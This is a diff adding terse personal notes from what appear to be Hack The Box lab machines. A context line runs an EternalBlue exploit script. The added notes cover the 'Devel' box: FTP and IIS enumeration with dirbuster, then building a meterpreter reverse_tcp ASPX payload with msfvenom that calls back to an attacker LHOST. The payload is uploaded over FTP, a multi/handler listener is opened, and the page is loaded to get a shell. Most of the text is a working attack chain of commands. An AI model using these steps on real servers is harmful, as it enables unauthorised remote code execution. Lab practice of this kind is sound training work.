@@ -176,8 +176,33 @@ https://github.com/3ndG4me/AutoBlue-MS17-010
 python eternalblue_exploit7.py 10.10.10.40 ./shellcode/sc_all.bin
 
 
+-------------------------------------------------------------------------
+DEVEL - beautiful
 
+Port 21 ftp -80 http
+MS IIS - header
+Firefox 10.10.10.5 open
 
+enumerate ->> dirbuster&
+http://10.10.10.5
+/usr/share/wordlists/...small.txt
+Apache is php
+asm, asmx, asp, aspx,txt
+...
 
+ftp 10.10.10.5
+put dog.jpg
+
+msfvenom cheat sheet
+https://netsec.ws/?p=331
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.27 LPORT=4444 -f aspx > ex.aspx
+
+msfconsole
+exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+
+ftp put ex.aspx
+
+open browser 10.10.10.5/ex.aspx
 
 
